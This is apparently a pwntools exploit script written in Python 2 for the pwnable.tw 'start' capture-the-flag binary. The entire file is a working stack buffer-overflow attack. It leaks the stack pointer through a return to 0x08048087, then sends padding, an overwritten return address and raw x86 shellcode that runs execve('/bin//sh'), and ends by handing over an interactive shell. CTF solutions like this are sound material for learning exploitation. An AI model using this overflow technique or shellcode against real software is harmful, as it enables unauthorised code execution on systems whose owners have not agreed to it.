from pwn import *
context.log_level = 'DEBUG'
r = process('./start')
# r = remote('chall.pwnable.tw',10000)

raw_input("#")

r.recvuntil("")
r.send('a'*20+p32(0x08048087))

r.recvuntil("Let's start the CTF:")
k=r.recv(4)
esp = u32(k)
print k
print 'esp = ',hex(esp),k

shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

r.send('a'*20+p32(esp+20)+shellcode)

r.interactive()
